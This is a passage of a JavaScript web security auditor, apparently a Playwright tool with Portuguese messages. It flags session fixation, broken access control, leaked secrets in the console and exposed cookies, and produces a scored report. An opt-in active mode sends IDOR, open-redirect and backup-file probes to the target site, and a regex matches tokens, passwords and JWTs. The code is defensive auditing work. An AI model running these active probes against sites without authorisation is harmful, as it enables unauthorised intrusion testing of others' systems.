  const beforeByName = Object.fromEntries(cookieSnapshotBefore.map(c => [c.name, c.value]));
  const fixationFindings = [];
  for (const c of cookieSnapshotAfter) {
    if (!sessionRe.test(c.name)) continue;
    if (beforeByName[c.name] !== undefined && beforeByName[c.name] === c.value && c.value) {
      fixationFindings.push({
        type: 'session_fixation', severity: 'HIGH', thirdParty: false, phase: 'LOGIN',
        cookieName: c.name,
        label: `Possível session fixation em "${c.name}"`,
        risk: `O cookie de sessão "${c.name}" manteve o MESMO valor antes e depois do login. Se um atacante fixar esse valor no navegador da vítima (via link/XSS) antes do login, ele permanece válido depois — permitindo sequestro de sessão.`,
        recommendation: 'Regenerar o ID de sessão no servidor imediatamente após autenticação bem-sucedida (ex.: session.regenerate / novo Set-Cookie).',
      });
    }
  }
  if (fixationFindings.length > 0) {
    console.log(chalk.red(`\n  🔑 ${fixationFindings.length} possível(is) session fixation detectada(s)`));
    fixationFindings.forEach(logFinding);
  }

  if (allDiffs.length > 0) {
    console.log(chalk.yellow(`\n  📊 O login alterou ${allDiffs.length} item(ns):`));
    allDiffs.forEach(d => {
      const icon = d.type.includes('added') ? chalk.green('  ➕') : d.type.includes('removed') ? chalk.red('  ➖') : chalk.yellow('  ✏️');
      console.log(`${icon} ${d.note}`);
    });
  } else {
    console.log(chalk.green('  ✅ Login não alterou storage/cookies (pode usar autenticação via session ou header).'));
  }

  // Analisar os novos dados do storage pós-login com regras de segurança
  const postLoginStorageFindings = [
    ...analyzeStorage(storageSnapshotAfter.localStorage, 'localStorage'),
    ...analyzeStorage(storageSnapshotAfter.sessionStorage, 'sessionStorage'),
  ].map(f => ({ ...f, phase: 'LOGIN' }));

  // Analisar novos cookies pós-login
  const postLoginCookieFindings = analyzeCookies(cookieSnapshotAfter, pageOrigin).map(f => ({ ...f, phase: 'LOGIN' }));

  // Mostrar findings da fase de login
  const loginNetworkCount = loginPhaseNetworkFindings.length;
  if (loginNetworkCount > 0) {
    console.log(chalk.yellow(`\n  🌐 ${loginNetworkCount} achado(s) de rede durante o login:`));
    loginPhaseNetworkFindings.forEach(logFinding);
  }

  if (postLoginStorageFindings.length > 0) {
    console.log(chalk.yellow(`\n  📦 ${postLoginStorageFindings.length} problema(s) no storage pós-login:`));
    postLoginStorageFindings.forEach(logFinding);
  }

  if (postLoginCookieFindings.length > 0) {
    console.log(chalk.yellow(`\n  🍪 ${postLoginCookieFindings.length} problema(s) em cookies pós-login:`));
    postLoginCookieFindings.forEach(logFinding);
  }

  allFindings.push(...allDiffs, ...fixationFindings, ...loginPhaseNetworkFindings, ...postLoginStorageFindings, ...postLoginCookieFindings);

  // ══════════════════════════════════════════════════════════
  //  FASE 3: PÓS-LOGIN — Auditar páginas autenticadas
  // ══════════════════════════════════════════════════════════
  currentPhase = 'post-login';

  logPhaseHeader('PÓS-LOGIN', '🏠', 'AUDITORIA DE PÁGINAS AUTENTICADAS');
  console.log(chalk.cyan('\n🔒 Auditando páginas autenticadas...\n'));

  // Coletar dados da página atual (pós-login)
  const currentUrl = page.url();
  if (!visitedUrls.has(currentUrl)) {
    visitedUrls.add(currentUrl);
    const pageFindings = await collectPageData(page, currentUrl);
    allFindings.push(...pageFindings.map(f => ({ ...f, phase: 'PÓS-LOGIN' })));
  }

  // 🔓 Controle de acesso: reprova AGORA (autenticado) os paths que o recon achou
  // e compara com o resultado anônimo do pré-login → detecta acesso quebrado.
  if (reconCandidatePaths.length > 0) {
    console.log(chalk.cyan(`\n  🔓 Controle de acesso (anônimo × autenticado) em ${reconCandidatePaths.length} caminho(s)...`));
    try {
      const authProbe = await probePaths(context.request, pageOrigin, reconCandidatePaths);
      const acFindings = diffAccessControl(anonProbeResults, authProbe, pageOrigin);
      if (acFindings.length > 0) {
        console.log(chalk.red(`  ⚠️  ${acFindings.length} achado(s) de controle de acesso`));
        acFindings.forEach(logFinding);
      } else {
        console.log(chalk.green('  ✅ Nenhum acesso indevido aparente nos caminhos testados.'));
      }
      allFindings.push(...acFindings);
    } catch (err) { console.log(chalk.red(`  ❌ Erro no diff de acesso: ${err.message}`)); }
  }

  // Fingerprint da stack pelos cookies de sessão (pós-login)
  allFindings.push(...fingerprintFromCookies(cookieSnapshotAfter).map(f => ({ ...f, phase: 'PÓS-LOGIN' })));

  // Tier 3: testes ATIVOS (só com --active). Enviam requisições ao alvo.
  if (activeMode) {
    console.log(chalk.magenta('\n  🧪 Modo ATIVO: testando métodos HTTP, security.txt e arquivos sensíveis...'));
    try {
      const activeFindings = await runActiveChecks(page, pageOrigin);
      if (activeFindings.length > 0) {
        console.log(chalk.yellow(`  ⚠️  ${activeFindings.length} achado(s) nos testes ativos`));
        activeFindings.forEach(logFinding);
      } else {
        console.log(chalk.green('  ✅ Nenhum problema nos testes ativos.'));
      }
      allFindings.push(...activeFindings);
    } catch (err) {
      console.log(chalk.red(`  ❌ Erro nos testes ativos: ${err.message}`));
    }

    // IDOR/BOLA — troca de ID em requisições autenticadas capturadas.
    if (idorCandidates.length > 0) {
      console.log(chalk.magenta(`  🎯 Testando IDOR/BOLA em ${Math.min(10, idorCandidates.length)} rota(s) com ID...`));
      try {
        const idorFindings = await runIdorChecks(page, idorCandidates, pageOrigin);
        if (idorFindings.length > 0) {
          console.log(chalk.red(`  ⚠️  ${idorFindings.length} possível(is) IDOR/BOLA!`));
          idorFindings.forEach(logFinding);
        } else {
          console.log(chalk.green('  ✅ Nenhum IDOR aparente nas rotas testadas.'));
        }
        allFindings.push(...idorFindings);
      } catch (err) {
        console.log(chalk.red(`  ❌ Erro no teste de IDOR: ${err.message}`));
      }
    }

    // Open redirect (parâmetros de redirecionamento na URL alvo)
    try {
      const orFindings = await testOpenRedirect(context.request, targetUrl);
      if (orFindings.length > 0) {
        console.log(chalk.red(`  ↪️  ${orFindings.length} open redirect detectado(s)!`));
        orFindings.forEach(logFinding);
        allFindings.push(...orFindings);
      }
    } catch (err) { console.log(chalk.red(`  ❌ Erro no open redirect: ${err.message}`)); }

    // Arquivos de backup dos assets 1ª parte (.bak/.old/~ ...)
    if (firstPartyAssets.length > 0) {
      console.log(chalk.magenta(`  🗄️  Testando backup em ${Math.min(15, firstPartyAssets.length)} asset(s)...`));
      try {
        const bkFindings = await testBackupFiles(context.request, firstPartyAssets);
        if (bkFindings.length > 0) {
          console.log(chalk.red(`  ⚠️  ${bkFindings.length} arquivo(s) de backup exposto(s)!`));
          bkFindings.forEach(logFinding);
        }
        allFindings.push(...bkFindings);
      } catch (err) { console.log(chalk.red(`  ❌ Erro no teste de backup: ${err.message}`)); }
    }
  }

  // Modo navegação livre acompanhada (navigate): escuta cada clique/URL que o usuário navega
  if (scope === 'navigate') {
    console.log(chalk.cyan('\n🧭 Modo NAVEGAÇÃO LIVRE ativo: Navegue pelas telas do sistema no Edge.'));
    console.log(chalk.white('   Todas as páginas visitadas serão auditadas em tempo real.'));
    console.log(chalk.gray('   Para concluir: clique em "Finalizar" em http://localhost:3141 ou execute node sentinela.mjs done\n'));

    // Escutar navegações do usuário no Playwright
    const onFrameNavigated = async (frame) => {
      if (frame !== page.mainFrame()) return;
      const url = frame.url();
      if (!url || !url.startsWith('http') || visitedUrls.has(url)) return;
      visitedUrls.add(url);
      addTimeline(`Página visitada e auditada: ${url}`);
      console.log(chalk.cyan(`\n🔍 Auditando nova página visitada: ${url}`));
      try {
        await page.waitForTimeout(1000); // Aguardar render/SPA
        const pageFindings = await collectPageData(page, url);
        allFindings.push(...pageFindings.map(f => ({ ...f, phase: 'PÓS-LOGIN' })));
      } catch (err) {
        console.log(chalk.gray(`  (Erro ao auditar ${url}: ${err.message})`));
      }
    };

    page.on('framenavigated', onFrameNavigated);

    // Aguardar o sinal de finalização (HTTP finalize, .finalize file, ou browser.close)
    if (activeFinalizePromise) {
      await activeFinalizePromise;
    }
    page.off('framenavigated', onFrameNavigated);
  }

  } // fim do bloco (scope !== 'login')

  // Adicionar findings de rede (já taggeados com fase)
  allFindings.push(...networkFindings);

  // Issues do navegador (CDP Audits) — SameSite/CSP/mixed content/deprecações.
  if (browserIssues.length > 0) {
    console.log(chalk.yellow(`\n  📋 ${browserIssues.length} issue(s) reportada(s) pelo navegador (painel Issues)`));
    allFindings.push(...browserIssues);
  }

  // Console: dados sensíveis vazados + contagem de erros.
  const sensitiveConsole = consoleMessages.filter(m => /token|password|senha|secret|api[_-]?key|authorization|bearer|jwt/i.test(m.text));
  for (const m of sensitiveConsole.slice(0, 10)) {
    allFindings.push({
      type: 'console_sensitive', severity: 'MEDIUM', thirdParty: false, phase: 'PÓS-LOGIN',
      label: 'Dado sensível no console', currentValue: m.text.slice(0, 180),
      risk: 'Mensagem de console pode expor dados sensíveis a qualquer pessoa com o DevTools aberto.',
      recommendation: 'Remover console.log com dados sensíveis em produção (usar logger só em dev).',
    });
  }
  const errList = [...pageErrors, ...consoleMessages.filter(m => m.type === 'error').map(m => m.text)];
  if (errList.length > 0) {
    allFindings.push({
      type: 'console_error', severity: 'LOW', thirdParty: false, phase: 'PÓS-LOGIN',
      label: `${errList.length} erro(s) de JavaScript no console`,
      currentValue: errList.slice(0, 5).join(' | '),
      risk: 'Erros de JavaScript podem indicar bugs ou falhas que facilitam exploração (ex.: entrada não tratada).',
      recommendation: 'Investigar e corrigir os erros de console; eles não deveriam aparecer em produção.',
    });
  }

  // Classificar por origem qualquer finding (rede etc.) ainda sem rótulo de parte.
  // Achados de código/cookie já vêm rotulados; aqui pegamos os de rede/resposta
  // vindos de domínios de terceiros (ex.: forms.hscollectedforms.net).
  for (const f of allFindings) {
    if (f.thirdParty === undefined && f.url) {
      try {
        const { thirdParty, vendor } = classifyResource(String(f.url), pageOrigin);
        f.thirdParty = thirdParty;
        if (thirdParty && vendor && !f.vendor) f.vendor = vendor;
      } catch { /* url não classificável → deixa como 1ª parte */ }
    }
  }

  // Deduplicar findings
  const uniqueFindings = deduplicateFindings(allFindings);

  // Gerar relatório
  console.log(chalk.cyan('\n📝 Gerando relatório...'));
  const { reportPath, reportMdPath, reportHtmlPath, counts, thirdCounts, score, regression } = generateReport(uniqueFindings);

  // Resumo final (SÓ 1ª parte)
  const totalIssues = counts.CRITICAL + counts.HIGH + counts.MEDIUM + counts.LOW;
  const thirdTotal = thirdCounts.CRITICAL + thirdCounts.HIGH + thirdCounts.MEDIUM + thirdCounts.LOW;

  console.log(chalk.cyan.bold(`
╔════════════════════════════════════════════════════════════╗
║                    RESULTADO DA AUDITORIA                  ║
╠════════════════════════════════════════════════════════════╣`));

  console.log(chalk.white(`║  🎯 Alvo: ${targetUrl.padEnd(46)}║`));
  console.log(chalk.white(`║  📄 Páginas auditadas: ${String(visitedUrls.size).padEnd(34)}║`));
  console.log(chalk.white(`║  🔍 Problemas SEUS (1ª parte): ${String(totalIssues).padEnd(26)}║`));
  console.log(chalk.gray(`║  🏢 Terceiros (não contam na nota): ${String(thirdTotal).padEnd(21)}║`));
  console.log(chalk.white(`║                                                            ║`));

  if (counts.CRITICAL > 0) console.log(chalk.red(`║  🔴 CRITICAL: ${String(counts.CRITICAL).padEnd(42)}║`));
  if (counts.HIGH > 0) console.log(chalk.red(`║  🟠 HIGH:     ${String(counts.HIGH).padEnd(42)}║`));
  if (counts.MEDIUM > 0) console.log(chalk.yellow(`║  🟡 MEDIUM:   ${String(counts.MEDIUM).padEnd(42)}║`));
  if (counts.LOW > 0) console.log(chalk.blue(`║  🔵 LOW:      ${String(counts.LOW).padEnd(42)}║`));

  console.log(chalk.white(`║                                                            ║`));

  const scoreColor = score >= 80 ? chalk.green : score >= 50 ? chalk.yellow : chalk.red;
  console.log(scoreColor(`║  📊 NOTA: ${score}/100 ${score >= 80 ? '✅ BOM' : score >= 50 ? '⚠️  PRECISA MELHORAR' : '❌ INSEGURO'}`.padEnd(70) + '║'));

  console.log(chalk.cyan.bold(`║                                                            ║
╠════════════════════════════════════════════════════════════╣`));
  console.log(chalk.white(`║  📁 Relatório JSON: ${reportPath.substring(reportPath.lastIndexOf('\\') + 1).padEnd(37)}║`));
  console.log(chalk.white(`║  📄 Relatório MD:   ${reportMdPath.substring(reportMdPath.lastIndexOf('\\') + 1).padEnd(37)}║`));
  console.log(chalk.white(`║  🌐 Relatório HTML: ${reportHtmlPath.substring(reportHtmlPath.lastIndexOf('\\') + 1).padEnd(37)}║`));
  console.log(chalk.cyan.bold(`╚════════════════════════════════════════════════════════════╝`));

  if (regression && regression.hasPrev) {
    const delta = score - (regression.prevScore ?? score);
    const arrow = delta > 0 ? chalk.green(`+${delta}`) : delta < 0 ? chalk.red(`${delta}`) : '0';
    console.log(chalk.cyan(`\n🔁 vs execução anterior: nota ${regression.prevScore ?? '?'}→${score} (${arrow}) | 🆕 ${regression.new.length} novos | ✅ ${regression.fixed.length} corrigidos | ⏳ ${regression.persisted} persistentes`));
  }

  console.log(chalk.gray(`\nRelatórios salvos em: ${join(dirname(__dirname), 'reports')}`));

  // Fechar contexto (grava o HAR) e o navegador.
  try { await context.close(); } catch { /* ok */ }
  if (recordHar) {
    console.log(chalk.gray(`\n📦 HAR (rede completa, importável no Burp/ZAP): ${harPath.substring(harPath.lastIndexOf('\\') + 1)}`));
  }
  await browser.close();
  process.exit(0);
}

// Chave de deduplicação. Problemas "de site" (headers, cookies, código, storage)
// são colapsados ENTRE fases — o mesmo header ausente não deve contar 3x
// (pré-login + login + pós-login). Eventos de rede/diff do login mantêm a fase.
function dedupKey(f) {
  const t = f.type;
  if (['missing_security_header', 'weak_security_header', 'information_disclosure_header',
       'cors_wildcard', 'cors_credentials', 'no_https'].includes(t)) {
    return `${t}|${f.header || ''}`;                                   // posture do site, ignora fase+url
  }
  if (['cookie_insecure_flags', 'cookie_sensitive_no_httponly'].includes(t)) {
    return `${t}|${f.cookieName || ''}|${f.domain || ''}`;            // por cookie, ignora fase
  }
  if (['storage_sensitive_data', 'storage_jwt_exposed'].includes(t)) {
    return `${t}|${f.storage || ''}|${f.key || ''}`;
  }
  if (['exposed_key', 'dangerous_code', 'missing_sri', 'global_variable_sensitive',
       'frontend_role_definition'].includes(t)) {
    return `${t}|${f.url || ''}|${f.label || ''}|${f.match || f.src || ''}`; // por arquivo, ignora fase
  }
  if (['form_no_csrf', 'login_no_csrf'].includes(t)) {
    return `${t}`;
  }
  // Demais (rede durante login, diffs, inventário): mantém a fase.
  return `${t}|${f.phase || ''}|${f.key || f.cookieName || f.header || f.label || ''}|${f.storage || f.match || f.url || ''}`;
}

function deduplicateFindings(findings) {
  const seen = new Set();
  return findings.filter(f => {
    const key = dedupKey(f);
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

// Executar apenas se for o script principal (não quando importado pelo daemon)
const isMain = process.argv[1] && process.argv[1].replace(/\\/g, '/').endsWith('auditor.mjs');
if (isMain) {
  main().catch(err => {
    console.error(chalk.red(`\n❌ Erro fatal: ${err.message}`));
    console.error(err.stack);
    process.exit(1);
  });
}
